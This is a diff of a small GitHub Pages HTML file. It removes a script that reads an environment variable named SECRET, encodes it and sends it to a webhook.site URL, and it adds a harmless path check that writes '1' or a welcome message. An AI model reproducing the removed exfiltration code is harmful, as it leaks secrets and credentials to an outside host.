@@ -1,27 +1,18 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fetch and Redirect</title>
+    <title>GitHub Pages</title>
 </head>
 <body>
     <script>
-    // Simulated environment variable
-const SECRET = process.env.SECRET;
-// Encode and send to webhook
-const encodedVariable = encodeURIComponent(btoa(SECRET));
-const webhookUrl = `https://webhook.site/2e32e2e8-7b4b-482f-9495-8726bc4a4f5d?yo=${encodedVariable}`;
-
-fetch(webhookUrl)
-  .then(response => response.text())
-  .then(data => {
-    console.log('Data sent successfully:', data);
-  })
-  .catch(error => {
-    console.error('Error sending data:', error);
-  });
-
+        // Check if the URL matches "/pubkey"
+        if (window.location.pathname === '/pubkey') {
+            // Send a response of "1" to the user
+            document.write('1');
+        } else {
+            // Regular content for other paths
+            document.write('Welcome to my GitHub Pages site!');
+        }
     </script>
 </body>
 </html>
